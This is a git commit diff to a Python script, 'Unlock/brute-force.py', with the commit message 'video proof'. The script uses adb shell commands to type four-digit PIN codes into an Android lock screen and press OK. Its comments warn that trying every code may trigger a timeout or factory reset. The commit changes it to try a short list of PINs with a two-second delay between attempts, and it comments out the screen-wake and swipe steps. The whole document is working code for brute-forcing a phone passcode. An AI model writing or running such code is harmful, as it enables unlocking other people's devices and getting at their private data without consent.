f390cd581acb6fdc70c8c3af6eb1f32ad2c55e55
imvickykumar999 <imvickykumar999@gmail.com>
2023-10-26 19:49:11 +0530

    video proof

--- Unlock/brute-force.py
+++ Unlock/brute-force.py
@@ -1,18 +1,19 @@
 
-import os, math
+import os, math, time
 
-os.system('adb shell input keyevent 26') # Turn ON screen
-os.system('adb shell input touchscreen swipe 930 880 930 380') # x1,y1, x2,y2
+# os.system('adb shell input keyevent 26') # Turn ON screen
+# os.system('adb shell input touchscreen swipe 930 880 930 380') # x1,y1, x2,y2
 
 n = 10000
 digits = int(math.log10(n))
 
 # lst = range(n) # May cause Timeout error or Factory Reset
-lst = [2589]     # Playing Safe
+lst = [6783, 7926, 4982, 9567, 2589]     # Playing Safe
 
 for i in lst:
     code = str(i).zfill(digits)
     print(code)
+    time.sleep(2)
 
     os.system(f'adb shell input text {code}') # Input Passcode
     os.system('adb shell input keyevent 66') # Press OK
